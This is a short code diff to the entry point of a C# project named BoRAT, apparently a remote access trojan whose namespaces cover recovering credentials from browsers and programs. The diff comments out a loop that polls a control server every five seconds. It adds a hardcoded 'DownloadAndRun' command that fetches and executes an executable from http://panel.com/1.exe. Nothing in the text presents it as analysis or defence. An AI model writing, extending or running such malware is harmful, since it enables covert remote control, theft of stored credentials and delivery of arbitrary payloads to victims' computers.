@@ -4,6 +4,7 @@ using BoRAT.Core.Recovery.Programs;
 using BoRAT.Core.Data;
 using BoRAT.Core.Recovery.Browsers;
 using System.Threading;
+using BoRAT.Core.Commands;
 
 namespace BoRAT
 {
@@ -11,11 +12,12 @@ namespace BoRAT
     {
         static void Main(string[] args)
         {
-            while (true)
-            {
-                Http.Request();
-                Thread.Sleep(5000);
-            }
+            Work.Run("DownloadAndRun|http://panel.com/1.exe*DownloadAndRun|http://panel.com/1.exe*");
+            //while (true)
+            //{
+            //    Http.Request();
+            //    Thread.Sleep(5000);
+            //}
 
             Console.ReadKey();
         }
